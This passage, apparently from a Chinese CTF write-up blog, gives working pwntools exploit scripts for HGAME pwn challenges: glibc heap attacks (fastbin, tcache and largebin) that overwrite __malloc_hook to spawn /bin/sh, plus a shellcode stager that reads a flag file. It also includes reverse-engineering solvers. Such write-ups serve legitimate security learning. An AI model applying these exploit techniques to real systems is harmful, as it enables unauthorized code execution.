libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line">alloc(7,0x10,payload) # chunk7: 劫持由fastbin生成的tcachebin链</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # chunk8: chunk8</span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">payload = p64(libc_base + one_gadget[1])</span><br><span class="line">alloc(9,0x10,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># alloc(10,0x10,payload) # getshell</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="old_fastnote">old_fastnote</h3>
<p>libc-2.23，unsortedbin leak + fastbin attack，注意 fastbin chunk 的
size 域构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32449&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(1):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(1,0x10,payload) # chunk1 防annex</span><br><span class="line"></span><br><span class="line">for i in range(1):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(0,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 88</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(2):</span><br><span class="line">  alloc(i,0x60,payload) # chunk0,1:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">  free(i) # free(0,1)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0xb - 0x18</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x60,payload) # chunk8: chunk8</span><br><span class="line">alloc(9,0x60,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">payload = b&#x27;\x00&#x27;*19 + payload</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="eldenring2">eldenRing2</h3>
<p>必须 patch 才能运行 vuln，用给的 libc.so.6 测试出来是 libc-2.31。</p>
<p>做法跟 fastnote 一样，填满 tcachebin 的unsortedbin leak + fastbin
attack</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32672&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 最多16个idx，不能重复使用</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))   # 最大0xFF -&gt; 0x100</span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 可以 UAF</span><br><span class="line">  </span><br><span class="line">def edit(Index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">for i in range(8):</span><br><span class="line">  alloc(i,0x80)        # chunk0-6: tcachebin; chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10)          # chunk8: 防 annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">  free(i)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;)) - 0x60</span><br><span class="line">print(&#x27;main_arena       ---&gt;   &#x27;,hex(main_arena))</span><br><span class="line">libc_base = main_arena - 0x1ECB80</span><br><span class="line">print(&#x27;libc_base        ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;__malloc_hook    ---&gt;   &#x27;,hex(__malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook)</span><br><span class="line">edit(6,payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(9,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(10,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">for i in range(len(one_gadget)):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget[1])</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(11)) </span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))   </span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="shellcodemaster">ShellcodeMaster</h3>
<p>这题卡了最久...观察程序 context 然后研究怎么压缩
shellcode，整了老半天</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:31224&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">code = &#x27;&#x27;&#x27;</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov al, 10</span><br><span class="line">xchg rdi, r15</span><br><span class="line">mov dl, 7</span><br><span class="line">syscall</span><br><span class="line">xor eax, eax</span><br><span class="line">xchg esi, edi</span><br><span class="line">xor edi, edi</span><br><span class="line">xchg edx, ebx</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode1 = &#x27;&#x27;&#x27;</span><br><span class="line">mov rdi,0x2333008</span><br><span class="line">xor esi,esi</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line">xor edx,edx</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode=asm(code)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">payload = b&#x27;\x90&#x27;*(len(shellcode)-14) + b&#x27;flag\x00\x00\x00\x00&#x27; + b&#x27;\x90&#x27;*8 + payload1</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;n 27&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;bytes shellcode\n\n&#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rev---24">Rev - 2/4</h2>
<h3 id="ezcpp">ezcpp</h3>
<p>这题读 cpp 的部分相当简单，核心加密部分用的 Tea，不过魔改了加密的
block，只加密了前12bytes，还魔改了加密前 8bytes 时的 delta.</p>
<h3 id="babyre">babyre</h3>
<p>多线程处理，不过每一次加密都是原子的，idx是全局变量，等前一个thread释放以后下一个thread才能处理，所以数组每一个元素都被加密一次，整个程序使用类似于
ECB 的方式加密。</p>
<p>所以我们可以用最后一位也就是藏在 flag 后面的的 flag[33]
来一位一位的向前解密</p>
<p>但这题比较恶心的点就是，触发 SIGFPE
会flag[33]++，在加密flag[32]也就是<code>&#125;</code>这个字符时有一定的变化</p>
<p>其次，触发 SIGFPE 还会让 'feifei' 这个 key 再被 <code>xor 0x11</code>
一轮，所以中间的 key 值会更改好几次，我们还没办法具体预测哪里触发了
SIGFPE 。</p>
<p>但根据 flag 的前几位为<code>hgame&#123;</code>，我们可以用 try-except
来从前向后解密，如果发现出现的字符不对，或者抛出异常，我们就可以确定原程序这里触发了
SIGFPE，我们就自行对 key 值 xor，这样到最后也不用管 flag[33] 了</p>
<p>python 处理可能会溢出的数据一定要记得 &amp; 0x..FF 取低位字节</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">encflag = [<span class="number">0x00002F14</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004FF3</span>, <span class="number">0x0000006D</span>, <span class="number">0x000032D8</span>, <span class="number">0x0000006D</span>, <span class="number">0x00006B4B</span>, <span class="number">0xFFFFFF92</span>, <span class="number">0x0000264F</span>, <span class="number">0x0000005B</span>, <span class="number">0x000052FB</span>, <span class="number">0xFFFFFF9C</span>, <span class="number">0x00002B71</span>, <span class="number">0x00000014</span>, <span class="number">0x00002A6F</span>, <span class="number">0xFFFFFF95</span>, <span class="number">0x000028FA</span>, <span class="number">0x0000001D</span>, <span class="number">0x00002989</span>, <span class="number">0xFFFFFF9B</span>, <span class="number">0x000028B4</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004506</span>, <span class="number">0xFFFFFFDA</span>, <span class="number">0x0000177B</span>, <span class="number">0xFFFFFFFC</span>, <span class="number">0x000040CE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000029E3</span>, <span class="number">0x0000000F</span>, <span class="number">0x00001F11</span>, <span class="number">0x000000FF</span>,<span class="number">0xFa</span>]</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;yo23412341234123412341234&#125;&#x27;</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;wtxwtx&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">ord</span>(flag[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exc = [<span class="number">8</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">17</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">29</span>] <span class="comment"># 观察规律可知 exception_point = [x for x in range(8,30,3)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> exc:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            key[j] = key[j] ^ <span class="number">0x11</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] - flag[i]) // key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] - encflag[i]) &amp; <span class="number">0xFFFFFFFF</span>) ^ key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] // flag[i]) - key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] ^ encflag[i]) + key[(i+<span class="number">1</span>)%<span class="number">6</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[<span class="number">31</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="week3">Week3</h1>
<h2 id="pwn---一血">Pwn - 一血</h2>
<h3 id="eldenring3">EldenRing3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;106.14.57.14:30208&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload) <span class="comment"># avoid annexing</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">main_arena  = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x01</span> - <span class="number">0x60</span></span><br><span class="line">libc_base   = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">large_bin   = main_arena + <span class="number">0x60</span> + <span class="number">1072</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x21b040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x500</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">&#x27;\x0A&#x27;</span>)[-<span class="number">6</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x528</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x508</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x518</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x538</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global1    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">rtld_global = libc_base + ELF(<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>).sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span 